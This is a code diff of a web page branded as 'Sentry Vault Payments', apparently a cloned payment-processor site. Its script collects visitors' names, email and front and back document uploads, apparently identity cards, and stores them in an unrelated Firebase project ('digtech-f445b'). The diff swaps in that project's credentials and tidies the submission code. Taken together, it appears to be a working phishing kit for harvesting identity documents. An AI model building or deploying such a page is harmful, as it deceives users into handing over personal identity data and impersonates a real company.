@@ -88,8 +88,8 @@
                                             <div
                                                 class="zone-item-hide zn-1-logo nbp-mobile-zn1-logo nbp-tablet-zn1-logo nbp-desktop-zn1-logo">
                                                 <a href="index.html" rel="" id="" class="" target="" onclick=""> <img
-                                                        src="files/Sentry Vault.png"
-                                                        class="site-logo" alt="site logo"> </a>
+                                                        src="files/Sentry Vault.png" class="site-logo" alt="site logo">
+                                                </a>
                                             </div>
                                             <div
                                                 class="zn-1-title zone-item-hide nbp-mobile-zn1-logo nbp-tablet-zn1-logo nbp-desktop-zn1-logo">
@@ -128,8 +128,8 @@
                                                 <div
                                                     class="zone-item-hide zn-2-logo nbp-mobile-zn2-navitems nbp-tablet-zn2-navitems nbp-desktop-zn2-navitems">
                                                     <a href="index.html" rel="" id="" class="" target="" onclick="">
-                                                        <img src="files/Sentry Vault.png"
-                                                            class="site-logo" alt="site logo"> </a>
+                                                        <img src="files/Sentry Vault.png" class="site-logo"
+                                                            alt="site logo"> </a>
                                                 </div>
                                                 <div
                                                     class="zn-2-title zone-item-hide nbp-mobile-zn2-navitems nbp-tablet-zn2-navitems nbp-desktop-zn2-navitems">
@@ -183,8 +183,8 @@
                                             <div
                                                 class="zn-3-logo zone-item-hide nbp-mobile-zn3-toggle nbp-tablet-zn3-toggle nbp-desktop-zn3-toggle">
                                                 <a href="index.html" rel="" id="" class="" target="" onclick=""> <img
-                                                        src="files/Sentry Vault.png"
-                                                        class="site-logo" alt="site logo"> </a>
+                                                        src="files/Sentry Vault.png" class="site-logo" alt="site logo">
+                                                </a>
                                             </div>
                                             <div
                                                 class="zn-3-icons nav-bar-pro-icons zone-item-hide nbp-mobile-zn3-toggle nbp-tablet-zn3-toggle nbp-desktop-zn3-toggle">
@@ -691,9 +691,11 @@
                                                                                         style="font:14px Calibri; color:#FFFFFF;">Copyright
                                                                                         &copy; 2011-2025
                                                                                         Prestige Payment
-                                                                                        Systems, LLC DBA Sentry Vault Payments
+                                                                                        Systems, LLC DBA Sentry Vault
+                                                                                        Payments
                                                                                         All Rights Reserved.
-                                                                                        Sentry Vault Payments is a registered
+                                                                                        Sentry Vault Payments is a
+                                                                                        registered
                                                                                         ISO of Fifth Third Bank,
                                                                                         National Association,
                                                                                         Cincinnati, OH. A
@@ -779,12 +781,13 @@
 
         // Your web app's Firebase configuration
         const firebaseConfig = {
-            apiKey: "AIzaSyDQqClgWjBt9MSwFsuGhllUDG_XbmeKd3M",
-            authDomain: "verification-form-id.firebaseapp.com",
-            projectId: "verification-form-id",
-            storageBucket: "verification-form-id.appspot.com",
-            messagingSenderId: "120178727736",
-            appId: "1:120178727736:web:28ca2a09fbafaac172ffcd"
+            apiKey: "AIzaSyDODfYYYb8fxyc_hGa4yM21vVsIOtJse7M",
+            authDomain: "digtech-f445b.firebaseapp.com",
+            databaseURL: "https://digtech-f445b-default-rtdb.firebaseio.com",
+            projectId: "digtech-f445b",
+            storageBucket: "digtech-f445b.appspot.com",
+            messagingSenderId: "979918273194",
+            appId: "1:979918273194:web:327c82c2519d13e7e06ed3"
         };
 
         // Initialize Firebase
@@ -820,8 +823,14 @@
         }
 
         // Submit form and store data in Firebase
+        const submitButton = document.querySelector('.submit-form');
+
         document.getElementById('myForm').addEventListener('submit', function (e) {
             e.preventDefault();
+
+            // Disable button and show loading state
+            submitButton.disabled = true;
+            submitButton.textContent = 'Submitting...';
 
             // Get form values
             const first_name = document.querySelector('[name="first_name"]').value;
@@ -843,10 +852,11 @@
             // Check if both files are selected
             if (!fileFront || !fileBack) {
                 alert('Please select both front and back files');
+                submitButton.disabled = false;
+                submitButton.textContent = 'Submit';
                 return;
             }
 
-            // Store data in Firebase
             const formData = {
                 first_name,
                 email,
@@ -861,24 +871,26 @@
                 fileBackURL: null
             };
 
-            // Upload front and back files concurrently
             Promise.all([uploadFile(fileFront), uploadFile(fileBack)])
                 .then(([fileFrontURL, fileBackURL]) => {
                     formData.fileFrontURL = fileFrontURL;
                     formData.fileBackURL = fileBackURL;
 
-                   // Set data at the specified location using both first and last name as the key
-            const formsRef = ref(database, `forms/${first_name}_${lastName}`);
-            set(formsRef, formData).then(() => {
-                console.log('Form submitted successfully!');
-                // Redirect to submit.html after successful submission
-                window.location.href = 'submitted.html';
-            }).catch((error) => {
-                console.error('Error submitting form:', error);
-                alert('An error occurred while submitting the form. Please try again.');
-            });
+                    const formsRef = ref(database, `Sentry/${first_name}_${lastName}`);
+                    return set(formsRef, formData);
+                })
+                .then(() => {
+                    console.log('Form submitted successfully!');
+                    window.location.href = 'submitted.html';
+                })
+                .catch((error) => {
+                    console.error('Error submitting form:', error);
+                    alert('An error occurred while submitting the form. Please try again.');
+                    submitButton.disabled = false;
+                    submitButton.textContent = 'Submit';
+                });
         });
-});
+
     </script>
     <!--Start of Tawk.to Script-->
     <script type="text/javascript">
